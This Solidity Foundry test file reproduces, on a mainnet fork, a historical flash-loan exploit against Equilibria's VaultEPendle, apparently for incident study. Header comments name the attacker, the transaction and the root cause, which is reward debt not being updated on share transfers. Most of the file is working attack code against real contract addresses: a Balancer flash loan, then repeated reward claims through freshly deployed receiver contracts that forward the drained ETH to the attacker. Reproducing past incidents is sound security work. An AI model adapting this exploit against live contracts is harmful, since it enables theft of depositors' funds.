// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 62,661.57 USD
// Attacker : 0x4DCCc719f277eBeB8F7fdB68cD4b105E5bC325db
// Attack Contract : 0x0A2d023b1EcFbFb091464ADEbc852e19E0F02E6b
// Vulnerable Contract : 0x615b0B54e585ab83ba1c94a734cd4499dEc1C956
// Attack Tx : https://etherscan.io/tx/0x185a16017fb4d9b2fefdf5935435253d53d4758238275426b507fe54eb4fe97a
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x615b0B54e585ab83ba1c94a734cd4499dEc1C956#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1712
//
// Attack summary: The attacker flash-loaned ePendle, deposited it into VaultEPendle, and repeatedly moved the same
// stk-ePendle shares into fresh receiver contracts. Each fresh receiver claimed historical native-token rewards and
// forwarded the ETH to the attacker before the shares were pulled back.
// Root cause: VaultEPendle did not update reward debt on ERC20 share transfers, and public getReward(address)
// recomputed rewards for arbitrary fresh receiver accounts.

address constant ATTACKER = 0x4DCCc719f277eBeB8F7fdB68cD4b105E5bC325db;
address constant ATTACK_CONTRACT = 0x0A2d023b1EcFbFb091464ADEbc852e19E0F02E6b;
address constant VAULT_EPENDLE_PROXY = 0xd30d6fD662c0d92B49F3C3E478e125BA1D968059;
address constant VAULT_EPENDLE_IMPLEMENTATION = 0x615b0B54e585ab83ba1c94a734cd4499dEc1C956;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address payable constant WETH_TOKEN = payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
address constant PENDLE = 0x808507121B80c02388fAd14726482e061B8da827;
address constant EPENDLE = 0x22Fc5A29bd3d6CCe19a06f844019fd506fCe4455;
address constant EQB = 0xfE80D611c6403f70e5B1b9B722D2B3510B740B2B;
address constant XEQB = 0xd6eCfD0d5f1Dfd3ad30f267a3a29b3E1bC4fd54f;
address constant EPENDLE_DEPOSITOR = 0xa94603c910A95e0cC5a70b84558e21E711342D63;

bytes32 constant WETH_PENDLE_POOL_ID = 0xfd1cf6fd41f229ca86ada0584c63c49c3d66bbc9000200000000000000000438;

interface IEquilibriaVault is IERC20 {
    function depositAll() external returns (uint256);
    function withdrawAll() external returns (uint256);
    function getReward(
        address account
    ) external;
    function harvest() external;
}

interface IEPendleDepositor {
    function deposit(
        uint256 amount
    ) external returns (uint256);
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 23_203_451;
        vm.createSelectFork("mainnet", forkBlock);

        attacker = ATTACKER;
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical Attack Executor");
        vm.label(VAULT_EPENDLE_PROXY, "VaultEPendle Proxy");
        vm.label(VAULT_EPENDLE_IMPLEMENTATION, "VaultEPendle Implementation");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(EPENDLE, "ePendle");
        vm.label(VAULT_EPENDLE_PROXY, "stk-ePendle");
        vm.label(EQB, "EQB");
        vm.label(XEQB, "xEQB");
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 0.01 ether);
        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 vaultEthBefore = VAULT_EPENDLE_PROXY.balance;

        // step 1: deploy a local executor with the same ETH seed used by the initcode transaction.
        vm.startPrank(ATTACKER);
        EquilibriaEPendleAttacker localAttack = new EquilibriaEPendleAttacker{value: 0.01 ether}(payable(ATTACKER));
        vm.label(address(localAttack), "Local Attack Executor");

        // step 2: seed ePendle, enter VaultEPendle, cycle fresh reward receivers, and repay Balancer.
        localAttack.execute();
        vm.stopPrank();

        // step 3: prove the repeated native reward claim drained the vault to the attacker's receiver.
        uint256 attackerEthProfit = ATTACKER.balance - attackerEthBefore;
        assertGt(attackerEthProfit, 13 ether, "native ETH profit");
        assertLt(VAULT_EPENDLE_PROXY.balance, vaultEthBefore - 13 ether, "vault native ETH not drained");
    }
}

contract EquilibriaEPendleAttacker is IBalancerFlashLoanRecipient {
    address payable private immutable profitReceiver;

    constructor(
        address payable profitReceiver_
    ) payable {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function execute() external {
        // step 1: convert the small ETH seed into PENDLE and deposit it as ePendle.
        uint256 seedEth = address(this).balance;
        IWETH(WETH_TOKEN).deposit{value: seedEth}();
        IERC20(WETH_TOKEN).approve(BALANCER_VAULT, seedEth);

        uint256 pendleOut = _balancerSwap(WETH_TOKEN, PENDLE, seedEth);
        IERC20(PENDLE).approve(EPENDLE_DEPOSITOR, pendleOut);
        IEPendleDepositor(EPENDLE_DEPOSITOR).deposit(pendleOut);

        // step 2: harvest once so VaultEPendle holds the native rewards that will be repeatedly claimed.
        IEquilibriaVault(VAULT_EPENDLE_PROXY).harvest();

        // step 3: borrow the Balancer ePendle liquidity used to mint a large stk-ePendle share balance.
        address[] memory tokens = new address[](1);
        tokens[0] = EPENDLE;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = IERC20(EPENDLE).balanceOf(BALANCER_VAULT);
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");
        require(tokens.length == 1 && tokens[0] == EPENDLE, "unexpected flash loan");

        // step 4: deposit all ePendle and derive the trace's repeated share amount from this contract's balance.
        IERC20(EPENDLE).approve(VAULT_EPENDLE_PROXY, type(uint256).max);
        IEquilibriaVault(VAULT_EPENDLE_PROXY).depositAll();
        uint256 shareAmount = IERC20(VAULT_EPENDLE_PROXY).balanceOf(address(this));

        // step 5: each fresh receiver has zero reward debt, so the same transferred shares can claim again.
        for (uint256 i = 0; i < 20; i++) {
            RewardReceiver receiver = new RewardReceiver(profitReceiver);
            IERC20(VAULT_EPENDLE_PROXY).transfer(address(receiver), shareAmount);
            IEquilibriaVault(VAULT_EPENDLE_PROXY).getReward(address(receiver));
            IERC20(VAULT_EPENDLE_PROXY).transferFrom(address(receiver), address(this), shareAmount);
            receiver.exit();
        }

        // step 6: withdraw ePendle and return the flash loan.
        IEquilibriaVault(VAULT_EPENDLE_PROXY).withdrawAll();
        IERC20(EPENDLE).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function _balancerSwap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) private returns (uint256 amountOut) {
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: WETH_PENDLE_POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: tokenIn,
            assetOut: tokenOut,
            amount: amountIn,
            userData: ""
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        amountOut = IBalancerVault(BALANCER_VAULT).swap(singleSwap, funds, 0, block.timestamp);
    }
}

contract RewardReceiver {
    address payable private immutable profitReceiver;

    constructor(
        address payable profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
        IERC20(VAULT_EPENDLE_PROXY).approve(msg.sender, type(uint256).max);
    }

    receive() external payable {
        (bool success,) = profitReceiver.call{value: msg.value}("");
        require(success, "eth forward failed");
    }

    function exit() external {
        IERC20(XEQB).transfer(VAULT_EPENDLE_PROXY, IERC20(XEQB).balanceOf(address(this)));
        IERC20(EQB).transfer(VAULT_EPENDLE_PROXY, IERC20(EQB).balanceOf(address(this)));
    }
}
